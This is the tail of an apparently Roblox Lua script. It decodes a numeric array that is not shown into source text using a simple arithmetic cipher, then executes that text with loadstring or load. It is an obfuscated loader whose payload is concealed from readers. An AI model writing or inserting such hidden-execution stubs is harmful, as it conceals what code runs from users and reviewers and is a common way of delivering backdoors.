}
local IMHuOv = 2557
local pqrKec = 10
local bIOVMQ = ""

for wAHTbN = 1, #WvNzHM do
    local MKiHLb = (WvNzHM[wAHTbN] - IMHuOv - wAHTbN) % 256
    if MKiHLb < 0 then MKiHLb = MKiHLb + 256 end
    
    local char_val = math.floor(MKiHLb / pqrKec)
    bIOVMQ = bIOVMQ .. string.char(char_val)
end

local _f = loadstring or load
local _func, _err = _f(bIOVMQ)
if _func then
    _func()
else
    warn("VM Load Error: " .. tostring(_err))
end
